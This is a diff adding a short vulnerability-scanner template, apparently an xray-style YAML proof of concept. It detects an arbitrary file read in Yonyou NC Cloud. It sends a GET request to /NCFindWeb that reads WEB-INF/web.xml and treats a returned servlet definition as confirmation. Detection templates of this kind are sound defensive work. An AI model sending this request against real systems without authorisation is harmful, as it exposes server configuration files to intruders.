@@ -1,0 +1,17 @@
+name: yaml-poc-yonyou-yonyou_nc_cloud-readfile-CT-158094
+binding: d5fd97a0-389f-4d7f-9f46-852f8a3aa912
+detail:
+    author: system_user
+    vulnerability:
+        id: a0efee62-1e48-441e-9ae5-15178c9ecc96
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type == "application/xml" && response.body.bcontains(bytes("<servlet-name>NCInvokerServlet</servlet-name>"))
+expression: r0()
